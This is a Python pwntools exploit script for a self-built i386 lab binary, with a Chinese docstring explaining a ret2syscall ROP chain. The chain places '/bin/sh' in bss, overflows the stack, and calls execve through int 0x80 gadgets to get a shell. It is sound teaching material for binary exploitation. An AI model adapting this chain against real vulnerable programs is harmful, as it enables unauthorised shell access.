#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_ret2syscall_i386 —— 纯 syscall ROP（自造实验，L2）

目标二进制里**没有 libc**（静态、无 system、无 /bin/sh 字符串），所以不可能
ret2libc；栈又不可执行（NX），也不能 ret2shellcode。唯一的出路是把 syscall
参数一个个摆好，自己调 `execve`：

    name 阶段   read(0, bss_buf, 8)  -> 把 "/bin/sh\\0" 放进 0x804b010
    exploit 阶段 read(0, esp, 0x400) -> 栈溢出，ret 直接取 [esp]

链（i386 系统调用号 eax=11 / ebx=文件名指针 / ecx=argv / edx=envp）：

    pop eax ; 11
    pop ebx ; 0x804b010      # bss_buf -> "/bin/sh"
    pop ecx ; 0
    pop edx ; 0
    int 0x80                 # execve("/bin/sh", NULL, NULL)

与 `sandbox_seccomp` 的区别：那边是 seccomp 拦了 execve 只能 ORW；这边没有
沙箱，纯粹演示"没有 libc 时怎么用 syscall gadget 拿 shell"。
"""

import os
import time

from pwn import *

context(os="linux", arch="i386", log_level="info")

os.chdir(os.path.dirname(os.path.abspath(__file__)))
BIN = "./chal"

elf = ELF(BIN, checksec=False)

# 地址从 ELF 符号表里取（No PIE；`nm chal` 也能看到同样的值）
POP_EAX = elf.symbols["gadget_pop_eax_ret"]
POP_EBX = elf.symbols["gadget_pop_ebx_ret"]
POP_ECX = elf.symbols["gadget_pop_ecx_ret"]
POP_EDX = elf.symbols["gadget_pop_edx_ret"]
INT80 = elf.symbols["gadget_int80_ret"]      # int 0x80 ; ret
BSS_BUF = elf.symbols["bss_buf"]             # 0x100 字节可写数据区

SYS_EXECVE = 11


def start() -> tube:
    return process(BIN)


def exploit() -> bytes:
    p = start()

    p.recvuntil(b"name: ")
    p.send(b"/bin/sh\x00")          # read(0, bss_buf, 8) 固定 8 字节，无竞态
    p.recvuntil(b"exploit: ")

    chain = flat(
        POP_EAX, SYS_EXECVE,
        POP_EBX, BSS_BUF,
        POP_ECX, 0,
        POP_EDX, 0,
        INT80,
    )
    p.send(chain)

    time.sleep(0.3)
    p.sendline(b"echo __PWNED__; id; exit")
    out = p.recvrepeat(3).decode("utf-8", "ignore")
    p.close()

    print(out)
    if "__PWNED__" in out and "uid=" in out:
        log.success("shell ok (execve via int 0x80)")
    else:
        log.failure("no shell")
    return chain


if __name__ == "__main__":
    exploit()
